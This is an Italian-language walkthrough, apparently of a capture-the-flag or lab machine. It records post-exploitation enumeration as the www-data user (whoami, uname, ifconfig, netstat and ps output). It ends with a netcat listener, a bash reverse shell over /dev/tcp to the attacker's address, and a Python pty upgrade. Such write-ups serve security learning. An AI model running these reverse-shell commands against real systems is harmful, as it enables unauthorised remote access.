1) Eseguiamo il comando whoami:
## www-data

2) Eseguo il comando uname -a:
## Linux ubuntu 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

3) Eseguo il comando ifconfig:
## docker0: flags=4099 mtu 1500 inet 172.17.0.1 netmask 255.255.0.0 broadcast 172.17.255.255 ether 02:42:2f:3b:53:a9 txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 eth0: flags=4163 mtu 9001 inet 10.10.38.22 netmask 255.255.0.0 broadcast 10.10.255.255 inet6 fe80::dc:eff:fed4:109f prefixlen 64 scopeid 0x20 ether 02:dc:0e:d4:10:9f txqueuelen 1000 (Ethernet) RX packets 51769 bytes 7957524 (7.9 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 51830 bytes 37018453 (37.0 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73 mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10 loop txqueuelen 1000 (Local Loopback) RX packets 156 bytes 13784 (13.7 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 156 bytes 13784 (13.7 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0

4) Eseguo il comando netstat -an:
## Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 127.0.0.1:9001 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN tcp6 0 0 :::80 :::* LISTEN tcp6 0 0 :::21 :::* LISTEN tcp6 0 0 :::22 :::* LISTEN tcp6 0 0 10.10.38.22:80 10.8.21.1:32814 ESTABLISHED tcp6 0 0 10.10.38.22:80 10.8.21.1:55098 TIME_WAIT udp 0 0 127.0.0.53:53 0.0.0.0:* udp 0 0 10.10.38.22:68 0.0.0.0:* raw6 0 0 :::58 :::* 7 Active UNIX domain sockets (servers and established) Proto RefCnt Flags Type State I-Node Path unix 2 [ ACC ] SEQPACKET LISTENING 15254 /run/udev/control unix 3 [ ] DGRAM 14904 /run/systemd/notify unix 2 [ ACC ] STREAM LISTENING 14907 /run/systemd/private unix 2 [ ACC ] STREAM LISTENING 14917 /run/lvm/lvmpolld.socket unix 4 [ ] DGRAM 14919 /run/systemd/journal/dev-log unix 2 [ ACC ] STREAM LISTENING 14922 /run/lvm/lvmetad.socket unix 2 [ ACC ] STREAM LISTENING 14926 /run/systemd/journal/stdout unix 9 [ ] DGRAM 14928 /run/systemd/journal/socket unix 2 [ ACC ] STREAM LISTENING 23900 /var/run/mysqld/mysqld.sock unix 2 [ ] DGRAM 15301 /run/systemd/journal/syslog unix 2 [ ACC ] STREAM LISTENING 23975 /run/containerd/containerd.sock.ttrpc unix 2 [ ACC ] STREAM LISTENING 23976 /run/containerd/containerd.sock unix 2 [ ACC ] STREAM LISTENING 24466 /var/run/docker/metrics.sock unix 2 [ ACC ] STREAM LISTENING 24831 /var/run/docker/libnetwork/6707381341d5.sock unix 2 [ ACC ] STREAM LISTENING 19021 /var/lib/lxd/unix.socket unix 2 [ ACC ] STREAM LISTENING 19040 @ISCSIADM_ABSTRACT_NAMESPACE unix 2 [ ACC ] STREAM LISTENING 19010 /var/run/docker.sock unix 2 [ ACC ] STREAM LISTENING 19030 /run/acpid.socket unix 2 [ ACC ] STREAM LISTENING 19041 /var/run/dbus/system_bus_socket unix 2 [ ACC ] STREAM LISTENING 19045 /run/snapd.socket unix 2 [ ACC ] STREAM LISTENING 19047 /run/snapd-snap.socket unix 2 [ ACC ] STREAM LISTENING 19050 /run/uuidd/request unix 3 [ ] STREAM CONNECTED 20353 unix 3 [ ] STREAM CONNECTED 16080 /run/systemd/journal/stdout unix 3 [ ] DGRAM 16037 unix 3 [ ] STREAM CONNECTED 20433 /run/systemd/journal/stdout unix 2 [ ] DGRAM 20437 unix 3 [ ] STREAM CONNECTED 24077 unix 3 [ ] STREAM CONNECTED 21039 /run/systemd/journal/stdout unix 2 [ ] DGRAM 15434 unix 3 [ ] STREAM CONNECTED 20443 unix 3 [ ] STREAM CONNECTED 20497 unix 3 [ ] STREAM CONNECTED 20354 /run/systemd/journal/stdout unix 3 [ ] STREAM CONNECTED 20017 unix 3 [ ] STREAM CONNECTED 20503 /var/run/dbus/system_bus_socket unix 3 [ ] STREAM CONNECTED 20435 unix 3 [ ] STREAM CONNECTED 20454 unix 3 [ ] STREAM CONNECTED 15753 unix 3 [ ] STREAM CONNECTED 21038 unix 3 [ ] STREAM CONNECTED 20498 unix 3 [ ] DGRAM 16038 unix 2 [ ] DGRAM 15628 unix 2 [ ] DGRAM 20505 unix 2 [ ] DGRAM 20496 unix 3 [ ] STREAM CONNECTED 20501 /var/run/dbus/system_bus_socket unix 3 [ ] STREAM CONNECTED 20432 unix 3 [ ] STREAM CONNECTED 21201 /run/systemd/journal/stdout unix 3 [ ] STREAM CONNECTED 20018 /run/systemd/journal/stdout unix 3 [ ] STREAM CONNECTED 21200 unix 3 [ ] DGRAM 18358 unix 3 [ ] STREAM CONNECTED 16084 /run/systemd/journal/stdout unix 3 [ ] DGRAM 17575 unix 3 [ ] STREAM CONNECTED 22662 /var/run/dbus/system_bus_socket unix 3 [ ] STREAM CONNECTED 24469 /run/containerd/containerd.sock unix 3 [ ] STREAM CONNECTED 21622 /run/systemd/journal/stdout unix 3 [ ] STREAM CONNECTED 19043 unix 3 [ ] DGRAM 17573 unix 3 [ ] STREAM CONNECTED 24472 /run/containerd/containerd.sock unix 3 [ ] STREAM CONNECTED 21848 unix 2 [ ] DGRAM 18599 unix 3 [ ] STREAM CONNECTED 20500 /var/run/dbus/system_bus_socket unix 3 [ ] STREAM CONNECTED 21849 /run/systemd/journal/stdout unix 3 [ ] DGRAM 18360 unix 3 [ ] STREAM CONNECTED 19767 unix 3 [ ] STREAM CONNECTED 22244 /var/run/dbus/system_bus_socket unix 3 [ ] STREAM CONNECTED 20502 /var/run/dbus/system_bus_socket unix 3 [ ] STREAM CONNECTED 24471 unix 3 [ ] STREAM CONNECTED 22540 /run/systemd/journal/stdout unix 3 [ ] STREAM CONNECTED 24078 /run/systemd/journal/stdout unix 3 [ ] STREAM CONNECTED 24468 unix 3 [ ] STREAM CONNECTED 22615 unix 3 [ ] STREAM CONNECTED 21488 /run/systemd/journal/stdout unix 3 [ ] STREAM CONNECTED 18325 unix 3 [ ] STREAM CONNECTED 17520 unix 3 [ ] DGRAM 17392 unix 3 [ ] STREAM CONNECTED 21619 unix 3 [ ] STREAM CONNECTED 18326 /run/systemd/journal/stdout unix 3 [ ] STREAM CONNECTED 22243 unix 3 [ ] STREAM CONNECTED 17521 /run/systemd/journal/stdout unix 3 [ ] STREAM CONNECTED 22539 unix 3 [ ] STREAM CONNECTED 21487 unix 3 [ ] DGRAM 14905 unix 3 [ ] DGRAM 18361 unix 3 [ ] DGRAM 17576 unix 3 [ ] STREAM CONNECTED 21281 unix 3 [ ] STREAM CONNECTED 19044 unix 2 [ ] DGRAM 16033 unix 3 [ ] DGRAM 18359 unix 3 [ ] DGRAM 17574 unix 3 [ ] STREAM CONNECTED 18564 /run/systemd/journal/stdout unix 3 [ ] STREAM CONNECTED 22616 /var/run/dbus/system_bus_socket unix 3 [ ] STREAM CONNECTED 19768 /run/systemd/journal/stdout unix 3 [ ] STREAM CONNECTED 18563 unix 3 [ ] STREAM CONNECTED 22661 unix 2 [ ] DGRAM 18347 unix 3 [ ] DGRAM 17393 unix 2 [ ] DGRAM 24416 unix 2 [ ] DGRAM 17565 unix 3 [ ] STREAM CONNECTED 16001 unix 3 [ ] DGRAM 14906 unix 3 [ ] STREAM CONNECTED 21282 /run/systemd/journal/stdout unix 3 [ ] STREAM CONNECTED 20499 /var/run/dbus/system_bus_socket

5) Eseguo il comando ps -ef:

## UID PID PPID C STIME TTY TIME CMD root 1 0 0 17:21 ? 00:00:03 /sbin/init auto automatic-ubiquity noprompt root 2 0 0 17:21 ? 00:00:00 [kthreadd] root 4 2 0 17:21 ? 00:00:00 [kworker/0:0H] root 6 2 0 17:21 ? 00:00:00 [mm_percpu_wq] root 7 2 0 17:21 ? 00:00:00 [ksoftirqd/0] root 8 2 0 17:21 ? 00:00:00 [rcu_sched] root 9 2 0 17:21 ? 00:00:00 [rcu_bh] root 10 2 0 17:21 ? 00:00:00 [migration/0] root 11 2 0 17:21 ? 00:00:00 [watchdog/0] root 12 2 0 17:21 ? 00:00:00 [cpuhp/0] root 13 2 0 17:21 ? 00:00:00 [kdevtmpfs] root 14 2 0 17:21 ? 00:00:00 [netns] root 15 2 0 17:21 ? 00:00:00 [rcu_tasks_kthre] root 16 2 0 17:21 ? 00:00:00 [kauditd] root 17 2 0 17:21 ? 00:00:00 [xenbus] root 18 2 0 17:21 ? 00:00:00 [xenwatch] root 19 2 0 17:21 ? 00:00:00 [kworker/0:1] root 20 2 0 17:21 ? 00:00:00 [khungtaskd] root 21 2 0 17:21 ? 00:00:00 [oom_reaper] root 22 2 0 17:21 ? 00:00:00 [writeback] root 23 2 0 17:21 ? 00:00:00 [kcompactd0] root 24 2 0 17:21 ? 00:00:00 [ksmd] root 25 2 0 17:21 ? 00:00:00 [khugepaged] root 26 2 0 17:21 ? 00:00:00 [crypto] root 27 2 0 17:21 ? 00:00:00 [kintegrityd] root 28 2 0 17:21 ? 00:00:00 [kblockd] root 29 2 0 17:21 ? 00:00:00 [ata_sff] root 30 2 0 17:21 ? 00:00:00 [md] root 31 2 0 17:21 ? 00:00:00 [edac-poller] root 32 2 0 17:21 ? 00:00:00 [devfreq_wq] root 33 2 0 17:21 ? 00:00:00 [watchdogd] root 36 2 0 17:21 ? 00:00:00 [kswapd0] root 37 2 0 17:21 ? 00:00:00 [kworker/u31:0] root 38 2 0 17:21 ? 00:00:00 [ecryptfs-kthrea] root 80 2 0 17:21 ? 00:00:00 [kthrotld] root 81 2 0 17:21 ? 00:00:00 [acpi_thermal_pm] root 82 2 0 17:21 ? 00:00:00 [scsi_eh_0] root 83 2 0 17:21 ? 00:00:00 [scsi_tmf_0] root 84 2 0 17:21 ? 00:00:00 [scsi_eh_1] root 85 2 0 17:21 ? 00:00:00 [scsi_tmf_1] root 91 2 0 17:21 ? 00:00:00 [ipv6_addrconf] root 100 2 0 17:21 ? 00:00:00 [kstrp] root 117 2 0 17:21 ? 00:00:00 [charger_manager] root 182 2 0 17:21 ? 00:00:00 [ttm_swap] root 212 2 0 17:21 ? 00:00:00 [kdmflush] root 213 2 0 17:21 ? 00:00:00 [bioset] root 273 2 0 17:21 ? 00:00:00 [kworker/0:3] root 281 2 0 17:21 ? 00:00:00 [raid5wq] root 337 2 0 17:21 ? 00:00:00 [jbd2/dm-0-8] root 338 2 0 17:21 ? 00:00:00 [ext4-rsv-conver] root 368 2 0 17:21 ? 00:00:00 [kworker/0:1H] root 410 1 0 17:21 ? 00:00:00 /lib/systemd/systemd-journald root 422 2 0 17:21 ? 00:00:00 [iscsi_eh] root 427 1 0 17:21 ? 00:00:00 /sbin/lvmetad -f root 428 2 0 17:21 ? 00:00:00 [ib-comp-wq] root 429 2 0 17:21 ? 00:00:00 [ib-comp-unb-wq] root 430 2 0 17:21 ? 00:00:00 [ib_mcast] root 431 2 0 17:21 ? 00:00:00 [ib_nl_sa_wq] root 433 2 0 17:21 ? 00:00:00 [rdma_cm] root 437 1 0 17:21 ? 00:00:00 /lib/systemd/systemd-udevd root 556 2 0 17:21 ? 00:00:00 [jbd2/xvda2-8] root 557 2 0 17:21 ? 00:00:00 [ext4-rsv-conver] systemd+ 653 1 0 17:21 ? 00:00:00 /lib/systemd/systemd-timesyncd systemd+ 767 1 0 17:22 ? 00:00:00 /lib/systemd/systemd-networkd systemd+ 794 1 0 17:22 ? 00:00:00 /lib/systemd/systemd-resolved root 911 1 0 17:22 ? 00:00:00 /usr/sbin/cron -f root 923 1 0 17:22 ? 00:00:00 /usr/lib/accountsservice/accounts-daemon syslog 933 1 0 17:22 ? 00:00:00 /usr/sbin/rsyslogd -n root 935 1 0 17:22 ? 00:00:00 /lib/systemd/systemd-logind message+ 936 1 0 17:22 ? 00:00:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only daemon 968 1 0 17:22 ? 00:00:00 /usr/sbin/atd -f root 971 1 0 17:22 ? 00:00:00 /usr/bin/lxcfs /var/lib/lxcfs/ root 973 1 0 17:22 ? 00:00:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers root 974 1 0 17:22 ? 00:00:00 /usr/bin/amazon-ssm-agent root 979 1 0 17:22 ? 00:00:00 /usr/sbin/vsftpd /etc/vsftpd.conf root 996 1 0 17:22 ? 00:00:00 /usr/bin/containerd root 999 1 0 17:22 ? 00:00:00 /usr/lib/policykit-1/polkitd --no-debug root 1004 1 0 17:22 ? 00:00:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal root 1021 1 0 17:22 ttyS0 00:00:01 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220 root 1023 1 0 17:22 tty1 00:00:00 /sbin/agetty -o -p -- \u --noclear tty1 linux root 1035 1 0 17:22 ? 00:00:00 /usr/sbin/sshd -D root 1074 1 0 17:22 ? 00:00:00 /usr/sbin/apache2 -k start www-data 1077 1074 0 17:22 ? 00:00:01 /usr/sbin/apache2 -k start www-data 1078 1074 0 17:22 ? 00:00:01 /usr/sbin/apache2 -k start www-data 1079 1074 0 17:22 ? 00:00:01 /usr/sbin/apache2 -k start www-data 1080 1074 0 17:22 ? 00:00:01 /usr/sbin/apache2 -k start www-data 1081 1074 0 17:22 ? 00:00:01 /usr/sbin/apache2 -k start mysql 1175 1 0 17:22 ? 00:00:02 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid root 1311 1 0 17:22 ? 00:00:00 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock www-data 1654 1074 0 17:22 ? 00:00:01 /usr/sbin/apache2 -k start www-data 1826 1074 0 17:23 ? 00:00:01 /usr/sbin/apache2 -k start www-data 1827 1074 0 17:24 ? 00:00:01 /usr/sbin/apache2 -k start www-data 1828 1074 0 17:24 ? 00:00:01 /usr/sbin/apache2 -k start www-data 1829 1074 0 17:24 ? 00:00:01 /usr/sbin/apache2 -k start root 2173 2 0 18:14 ? 00:00:00 [kworker/u30:1] root 2284 2 0 18:25 ? 00:00:00 [kworker/u30:2] root 2324 2 0 18:35 ? 00:00:00 [kworker/u30:0] www-data 2412 1079 0 18:39 ? 00:00:00 sh -c ps -ef www-data 2413 2412 0 18:39 ? 00:00:00 ps -ef


6) Sfortunatamente molti comandi se li eseguo digitandoli in modo normale non vanno, ma se io li scrivo antecedendo /bin/<comando> dovrerebbero funzionare, proviamo in questo modo a caricare una reverse shell
7) Crea una porta di ascolto: sudo nc  -lvp 1234
8) Digito il codice della reverse shell: 
/bin/bash -c '/bin/bash >& /dev/tcp/10.8.21.1/1234 0>&1'

9) Rendo la shell interattiva: python3 -c 'import pty; pty.spawn("/bin/bash")'